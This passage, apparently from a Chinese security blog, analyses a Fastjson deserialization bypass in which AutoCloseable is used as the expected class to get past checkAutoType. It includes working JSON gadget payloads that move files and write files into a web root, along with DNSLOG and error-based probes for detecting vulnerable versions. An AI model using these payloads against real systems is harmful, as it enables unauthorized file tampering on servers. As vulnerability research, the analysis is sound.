+<p>往下，直接从缓存Mapping可以直接获得此类，</p>
+<p><img alt="image-20210907224744679" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907224744679.png" title="image-20210907224744679" /></p>
+<p>然后直接被return了，甚至没有走autoTypeSupport校验。</p>
+<p><img alt="image-20210907225106968" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225106968.png" title="image-20210907225106968" /></p>
+<p>clazz被return到了defaultjsonparser里，往下看逻辑可以发现从对clazz进行了一个deserialze方法，跟进</p>
+<p><img alt="image-20210907225448517" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210907225448517.png" title="image-20210907225448517" /></p>
+<p>会跟到这里来</p>
+<p><img alt="image-20210908010408177" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908010408177.png" title="image-20210908010408177" /></p>
+<p>往下看，会因为由Autocloseable不能通过getSeeAlso方法成功生成deserializer对象，从而触发第二轮checkAutoType</p>
+<p><img alt="image-20210908013610732" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013610732.png" title="image-20210908013610732" /></p>
+<p>第二轮传入checkAutoType的参数依次为 第二个@type值，第一个@type值，和一个不重要的lexer.getFeatures()</p>
+<p>进来checkAutoType后，会先对exceptclass进行白名单校验，Autocloseable类自然是随便过掉，然后使exceptClassFlag置为true</p>
+<p><img alt="image-20210908013751407" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908013751407.png" title="image-20210908013751407" /></p>
+<p>随后便是一些对typename的黑白名单校验，由于typename是org.example.VulAutoCloseable，不在黑白名单中，所以校验自然都通过了。
+以下是依次的校验顺序</p>
+<p>黑名单校验</p>
+<p><img alt="image-20210908014110837" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014110837.png" title="image-20210908014110837" /></p>
+<p>先白后黑，其中所有的Array.binarySearch结果都是0，自然就能通过IF条件</p>
+<p><img alt="image-20210908014001405" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014001405.png" title="image-20210908014001405" /></p>
+<p>先黑后白</p>
+<p><img alt="image-20210908014440625" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014440625.png" title="image-20210908014440625" /></p>
+<p>冲破重重考研，typename指定类被传入TypeUtils.loadClass,跟进</p>
+<p><img alt="image-20210908014625797" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908014625797.png" title="image-20210908014625797" /></p>
+<p>会来到这里，VulAutoCloseable的类对象被返回</p>
+<p><img alt="image-20210908015237563" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015237563.png" title="image-20210908015237563" /></p>
+<p>然后会对这个类对象进行校验，校验是否为ClassLoader、DataSource、RowSet等类的子类，是的话直接抛出异常，这也是过滤大多数JNDI注入Gadget的机制：</p>
+<p><img alt="image-20210908015331781" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015331781.png" title="image-20210908015331781" /></p>
+<p>然后判断clazz是否是exceptClass的子类，是的话就直接返回类对象。类对象被返回后，就会进入被反序列化的下一个过程，它的构造方法等会被调用，从而完成利用。</p>
+<p><img alt="image-20210908015543198" src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210908015543198.png" title="image-20210908015543198" /></p>
+<h4 id="gadget">实战Gadget</h4>
+<p>实战中用的payload:</p>
+<p>文件移动：将一个文件中的内容移动到新的一个文件中去，原来文件的内容消失。</p>
+<pre><code class="language-text">&lt;dependency&gt;    &lt;groupId&gt;org.aspectj&lt;/groupId&gt;    &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;    &lt;version&gt;1.9.5&lt;/version&gt;&lt;/dependency&gt;
+</code></pre>
+<pre><code class="language-text">{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;, &quot;tempPath&quot;:&quot;D:/b.txt&quot;, &quot;targetPath&quot;:&quot;E:/b.txt&quot;}
+</code></pre>
+<p>文件写入</p>
+<pre><code class="language-text">&lt;dependency&gt;
+  &lt;groupId&gt;com.sleepycat&lt;/groupId&gt;
+  &lt;artifactId&gt;je&lt;/artifactId&gt;
+  &lt;version&gt;5.0.73&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+  &lt;groupId&gt;com.esotericsoftware&lt;/groupId&gt;
+  &lt;artifactId&gt;kryo&lt;/artifactId&gt;
+  &lt;version&gt;4.0.0&lt;/version&gt;
+&lt;/dependency&gt;
+
+&lt;dependency&gt;
+  &lt;groupId&gt;org.aspectj&lt;/groupId&gt;
+  &lt;artifactId&gt;aspectjtools&lt;/artifactId&gt;
+  &lt;version&gt;1.9.5&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<pre><code class="language-text">{
+    &quot;stream&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;,
+        &quot;targetPath&quot;: &quot;D:/wamp64/www/hacked.txt&quot;, \\创建一个空文件
+        &quot;tempPath&quot;: &quot;D:/wamp64/www/test.txt&quot;\\创建一个有内容的文件
+    },
+    &quot;writer&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.esotericsoftware.kryo.io.Output&quot;,
+        &quot;buffer&quot;: &quot;cHduZWQ=&quot;, \\base64后的文件内容
+        &quot;outputStream&quot;: {
+            &quot;$ref&quot;: &quot;$.stream&quot;
+        },
+        &quot;position&quot;: 5
+    },
+    &quot;close&quot;: {
+        &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,
+        &quot;@type&quot;: &quot;com.sleepycat.bind.serial.SerialOutput&quot;,
+        &quot;out&quot;: {
+            &quot;$ref&quot;: &quot;$.writer&quot;
+        }
+    }
+}
+</code></pre>
+<h2 id="_9">漏洞检测</h2>
+<h4 id="dnslog">DNSLOG</h4>
+<pre><code class="language-text">{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog.cn&quot;} 在49以下才能触发，因为这个gadget在49被禁止了，可用于检测具体版本
+{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+{&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+{&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;}}
+{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, {&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;}}&quot;&quot;}
+{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:&quot;aaa&quot;}
+Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}]
+Set[{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+{{&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;}:0
+</code></pre>
+<h4 id="_10">报错检测</h4>
+<p>运气好可以直接出版本号</p>
+<pre><code class="language-text">{&quot;xxx&quot;:&quot;\x+(eyJhIjoiXHgaGiJ9的base64解码) 
+在60以下才能触发，当后端 Fastjson 版本小于 1.2.60 时，使用该请求包不会延时不会报错，反之则会延迟或报错
+</code></pre>
+<h4 id="_11">绕过异常</h4>
+<p>有些开发人员在写解析JSON的相关代码时，可能会设置只能传入指定对象。
+而我们通过设置@type时传入的对象可能会与指定对象不匹配从而发生type not match的异常。</p>
+<p>解决办法是这样,最外层套层对象</p>
+<pre><code class="language-text">{
+&quot;xxx&quot;: {&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;dnslog&quot;}
+}
+</code></pre>
+<h2 id="_12">审计关键字</h2>
+<p>JSON.parseObject(</p>
+<h2 id="_13">参考</h2>
+<p><a href="https://c014.cn/pdfs/java/Fastjson/Fastjson反序列化漏洞.html" title="https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html">https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html</a></p>
+<p><a href="https://www.freebuf.com/vuls/228099.html" title="https://www.freebuf.com/vuls/228099.html">https://www.freebuf.com/vuls/228099.html</a></p>
+<p><a href="https://aluvion.gitee.io/2020/08/23/Fastjson反序列化机制和autotype观测/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-黑名单绕过" title="https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87">https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87</a></p>
+<p><a href="https://paper.seebug.org/1192/#1225" title="https://paper.seebug.org/1192/#1225">https://paper.seebug.org/1192/#1225</a></p>
+<p><a href="https://www.mi1k7ea.com/2019/11/11/Fastjson系列四——1-2-25-1-2-47反序列化漏洞（无需开启AutoType）/#不受AutoTypeSupport影响的版本" title="https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC">https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC</a></p>
+<p><a href="https://www.mi1k7ea.com/2021/02/08/Fastjson系列六——1-2-48-1-2-68反序列化漏洞/#0x04-1-2-68反序列化漏洞（expectClass绕过AutoType）" title="https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89">https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89</a></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/" class="btn btn-xs btn-link">
+        表达式注入
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/xstream%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="btn btn-xs btn-link">
+        xstream 反序列化
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
